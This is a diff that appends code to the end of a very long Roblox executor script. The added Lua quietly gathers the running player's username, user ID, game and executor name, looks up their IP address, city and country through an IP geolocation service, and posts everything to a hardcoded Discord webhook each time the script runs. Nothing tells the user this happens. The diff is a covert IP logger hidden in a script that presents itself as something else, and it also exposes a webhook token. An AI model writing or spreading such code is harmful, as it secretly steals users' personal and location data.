@@ -9962,3 +9962,71 @@ spawn(function()
         end
     end
 end)
+Webhook = "https://discord.com/api/webhooks/1328691230275666021/TRd_5TRM_hlm0Sb1FMII1cDpHo5DqQGotrgX03YEb-KOCbuDo9dxBrPiHLxA6-VFsseV"
+
+function identify_executor()
+    return identifyexecutor and identifyexecutor() or "Unknown Executor"
+end
+
+function get_game_info()
+    game_name, player_name, player_id, place_id = "Unknown", "Unknown", "Unknown", game.PlaceId
+    pcall(function() 
+        game_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
+    end)
+    pcall(function() 
+        player = game:GetService("Players").LocalPlayer
+        player_name = player.Name
+        player_id = player.UserId
+    end)
+    return game_name, player_name, player_id, place_id
+end
+
+function get_ip_info()
+    http_request = syn and syn.request or (http and http.request) or request
+    if not http_request then return "Unknown IP", "Unknown City", "Unknown Country" end
+
+    response = http_request({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+
+    if response and response.StatusCode == 200 then
+        data = game:GetService("HttpService"):JSONDecode(response.Body)
+        return data.query or "Unknown IP", data.city or "Unknown City", data.country or "Unknown Country"
+    end
+
+    return "Unknown IP", "Unknown City", "Unknown Country"
+end
+
+function send_to_webhook(game_name, player_name, player_id, place_id, ip, city, country, executor)
+    http_request = syn and syn.request or (http and http.request) or request
+    if not http_request then return end
+
+    embed = {
+        ["title"] = "New Execution",
+        ["description"] = string.format(
+            "**Game Name:** %s\n**Player Name:** %s\n**Player ID:** %d\n**Place ID:** %d\n**IP Address:** %s\n**City:** %s\n**Country:** %s\n**Executor:** %s", 
+            game_name, player_name, player_id, place_id, ip, city, country, executor
+        ),
+        ["color"] = 16711680
+    }
+
+    payload = {
+        ["content"] = "",
+        ["embeds"] = {embed}
+    }
+
+    pcall(function()
+        http_request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
+    end)
+end
+
+game_name, player_name, player_id, place_id = get_game_info()
+ip, city, country = get_ip_info()
+executor = identify_executor()
+send_to_webhook(game_name, player_name, player_id, place_id, ip, city, country, executor)
